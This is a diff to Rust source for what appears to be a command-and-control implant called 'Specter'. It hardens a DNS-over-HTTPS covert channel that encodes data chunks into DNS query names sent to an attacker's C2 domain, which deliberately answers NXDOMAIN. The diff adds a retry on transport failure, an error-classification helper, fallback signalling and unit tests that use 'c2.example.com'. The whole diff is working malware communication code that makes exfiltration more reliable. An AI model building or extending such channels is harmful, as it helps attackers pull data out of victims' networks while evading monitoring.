@@ -35,7 +35,7 @@
 
 use std::time::Duration;
 
-use tracing::{debug, trace};
+use tracing::{debug, trace, warn};
 
 use crate::error::SpecterError;
 
@@ -123,10 +123,36 @@ impl DohTransport {
         for (seq, chunk) in chunks.iter().enumerate() {
             let name = format!("{}.{seq:04x}{total:04x}.{session}.u.{}", chunk, self.c2_domain);
             trace!(seq, name = %name, "DoH uplink chunk");
-            // Fire-and-forget: the server reads the name; we don't need the answer.
-            // Errors here are non-fatal (the query still reached the authoritative
-            // server even if the DoH resolver returns NXDOMAIN).
-            let _ = self.txt_query(&name).await;
+            // DNS-level NXDOMAIN is expected and non-fatal: the authoritative C2
+            // server receives the encoded chunk in the query *name* and deliberately
+            // returns NXDOMAIN (there is no real record to return).  The chunk was
+            // delivered as long as the DoH resolver successfully forwarded the query.
+            //
+            // HTTP transport errors (connection failure, timeout, HTTP 4xx/5xx) are
+            // fatal for this chunk: the query never reached the resolver, so the
+            // chunk was never forwarded.  We retry once to handle transient issues;
+            // if the retry also fails with a transport error we propagate the error
+            // so the caller (e.g. FallbackTransport) can switch to an alternate path
+            // before the uplink is declared complete.
+            if let Err(e) = self.txt_query(&name).await {
+                if is_dns_level_error(&e) {
+                    // NXDOMAIN from the authoritative server — chunk was delivered.
+                    trace!(seq, "DoH uplink chunk {seq}: DNS-level NXDOMAIN (expected, non-fatal)");
+                } else {
+                    // Transport-level failure — chunk may not have been delivered.
+                    warn!(seq, err = %e, "DoH uplink chunk {seq} transport error, retrying once");
+                    let retry_result = self.txt_query(&name).await;
+                    if let Err(retry_err) = retry_result {
+                        if !is_dns_level_error(&retry_err) {
+                            return Err(SpecterError::Transport(format!(
+                                "DoH: uplink chunk {seq}/{total} failed after retry: {retry_err}"
+                            )));
+                        }
+                        // Retry got NXDOMAIN — chunk was delivered on retry.
+                        trace!(seq, "DoH uplink chunk {seq}: delivered on retry (DNS NXDOMAIN)");
+                    }
+                }
+            }
         }
 
         // --- downlink ---
@@ -231,6 +257,25 @@ impl DohTransport {
 
         parse_doh_txt_records(&body).map_err(SpecterError::Transport)
     }
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Error classification
+// ──────────────────────────────────────────────────────────────────────────────
+
+/// Returns `true` when `err` represents a DNS-level non-zero status code
+/// (e.g. NXDOMAIN, SERVFAIL) reported by the DoH resolver.
+///
+/// A DNS-level error means the HTTP exchange with the DoH resolver **succeeded**
+/// and the resolver forwarded the query to the authoritative server.  For
+/// uplink chunks the authoritative C2 server returns NXDOMAIN intentionally,
+/// so this kind of error is non-fatal: the chunk was delivered.
+///
+/// Returns `false` for HTTP transport errors (connection refused, timeout,
+/// HTTP 4xx/5xx, body read failure).  In those cases the query never reached
+/// the resolver and the chunk was **not** forwarded.
+fn is_dns_level_error(err: &SpecterError) -> bool {
+    matches!(err, SpecterError::Transport(msg) if msg.contains("DNS status"))
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -618,5 +663,53 @@ mod tests {
     fn doh_transport_constructs_successfully() {
         let t = DohTransport::new("c2.example.com".to_string(), DohProvider::Cloudflare);
         assert!(t.is_ok());
+    }
+
+    // ── is_dns_level_error ────────────────────────────────────────────────
+
+    #[test]
+    fn dns_level_error_detects_nxdomain_message() {
+        let err = SpecterError::Transport("DoH: DNS status 3 (NXDOMAIN or error)".to_string());
+        assert!(is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_detects_servfail_message() {
+        // SERVFAIL is DNS status 2; still a DNS-level response, chunk was forwarded.
+        let err = SpecterError::Transport("DoH: DNS status 2 (NXDOMAIN or error)".to_string());
+        assert!(is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_http_transport_error() {
+        let err = SpecterError::Transport("DoH HTTP error: connection refused".to_string());
+        assert!(!is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_http_status_error() {
+        let err = SpecterError::Transport("DoH returned HTTP 503".to_string());
+        assert!(!is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_body_read_error() {
+        let err = SpecterError::Transport("DoH response read error: connection reset".to_string());
+        assert!(!is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_non_transport_variant() {
+        let err = SpecterError::InvalidConfig("bad config");
+        assert!(!is_dns_level_error(&err));
+    }
+
+    #[test]
+    fn dns_level_error_rejects_uplink_retry_error() {
+        // The retry-propagation error message should NOT look like a DNS-level error.
+        let err = SpecterError::Transport(
+            "DoH: uplink chunk 2/5 failed after retry: DoH returned HTTP 503".to_string(),
+        );
+        assert!(!is_dns_level_error(&err));
     }
 }
